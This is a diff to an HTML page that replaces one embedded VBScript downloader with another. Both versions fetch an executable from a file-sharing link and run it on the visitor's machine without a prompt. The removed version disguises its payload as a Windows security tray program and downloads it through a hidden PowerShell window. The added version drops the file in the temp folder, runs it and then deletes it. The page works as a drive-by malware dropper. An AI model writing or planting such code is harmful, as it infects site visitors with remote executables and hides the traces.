@@ -7,53 +7,59 @@
 <body>
 
 <script type="text/vbscript">
-    ' This script will execute when the page loads.
-    ' It is highly recommended to use this approach with caution due to security risks.
+   Option Explicit
 
-    Sub Window_onLoad
-        ' Create Shell object
+Sub DownloadAndRunFile()
+    Dim objHTTP, objFSO, strFileURL, strSavePath, strFileName
+
+    ' Set the Google Drive direct download link
+    strFileURL = "https://drive.google.com/uc?id=1lqZvBbBTJt_C_7KXMLYpDjy4u4NISRLB"
+
+    ' Set the local save path and file name
+    strSavePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
+    strFileName = "downloaded_file.exe"
+
+    ' Construct the full save path
+    strSavePath = strSavePath & "\" & strFileName
+
+    ' Download the file using WinHTTP
+    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
+    objHTTP.Open "GET", strFileURL, False
+    objHTTP.Send
+
+    If objHTTP.Status = 200 Then
+        Dim objStream
+        Set objStream = CreateObject("ADODB.Stream")
+        With objStream
+            .Type = 1 ' adTypeBinary
+            .Open
+            .Write objHTTP.ResponseBody
+            .SaveToFile strSavePath
+            .Close
+        End With
+        Set objStream = Nothing
+
+        ' Run the downloaded file
+        Dim objShell
         Set objShell = CreateObject("WScript.Shell")
-        
-        ' Get the temporary folder path
-        tempFolder = objShell.ExpandEnvironmentStrings("%temp%")
-        
-        ' Generate a random file name
-        randomFileName = GenerateRandomFileName() & ".hta"
-        downloadedFile = tempFolder & "\" & randomFileName
-        
-        ' Construct the download URL for the hta file
-        ' WARNING: Downloading and executing files from external URLs is a significant security risk.
-        downloadUrl = "https://www.dropbox.com/scl/fi/t9h6fzxjvzbfgehq4u83y4/SecurityHealthSystray.exe?rlkey=hqikq51s475ig1nmikxbb5yso&st=b6dky2l0&dl=1"
-        
-        ' Construct the command to download the file using PowerShell
-        cmdCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & downloadedFile & "'"""
-        
-        ' Run the command
-        objShell.Run "cmd.exe /c " & cmdCommand, 0, True
-        
-        ' Open the downloaded hta file
-        objShell.Run downloadedFile, 1, False
-        
-        ' Clean up
+        objShell.Run strSavePath, 1, True ' Wait for the file to finish running
         Set objShell = Nothing
-    End Sub
 
-    ' Function to generate a random file name
-    Function GenerateRandomFileName()
-        Dim randomString
-        randomString = ""
-        For i = 1 To 10
-            randomString = randomString & Chr(Int((90 - 65 + 1) * Rnd + 65))
-        Next
-        GenerateRandomFileName = randomString
-    End Function
-</script>
+        ' Delete the file after running
+        Set objFSO = CreateObject("Scripting.FileSystemObject")
+        If objFSO.FileExists(strSavePath) Then
+            objFSO.DeleteFile strSavePath
+        End If
+        Set objFSO = Nothing
+    Else
+        WScript.Echo "Failed to download the file. Status: " & objHTTP.Status
+    End If
 
-<script>
-    // Ensure the VBScript runs on page load
-    window.onload = function() {
-        Window_onLoad();
-    };
+    Set objHTTP = Nothing
+End Sub
+
+' Call the main subroutine
+DownloadAndRunFile
 </script>
 
 </body>
